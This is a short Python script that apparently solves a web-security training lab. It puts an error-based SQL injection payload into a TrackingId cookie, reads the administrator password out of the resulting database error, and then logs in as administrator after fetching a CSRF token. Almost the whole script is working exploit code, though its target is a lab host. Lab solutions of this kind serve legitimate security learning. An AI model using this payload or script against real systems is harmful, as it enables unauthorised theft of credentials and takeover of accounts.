import requests
from lxml import html

URL = "https://0a5e001d034e31ca80061c5000fb0013.web-security-academy.net/"
session = requests.Session()
cookie = {
    "TrackingId": ""
}

PAYLOAD_1 = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
cookie["TrackingId"] = PAYLOAD_1

response = session.get(URL + "login", cookies=cookie).text
parser = html.fromstring(response)

username = "administrator"
password = parser.xpath("//h4/text()")[0].split('"')[1]

# Login

response = session.get(URL + "login").text
parser = html.fromstring(response)
csrf_token = parser.xpath("//input[@name='csrf']/@value")

PAYLOAD_2 = {
    "csrf": csrf_token,
    "username": username,
    "password": password
}

session.post(URL + "login", data=PAYLOAD_2)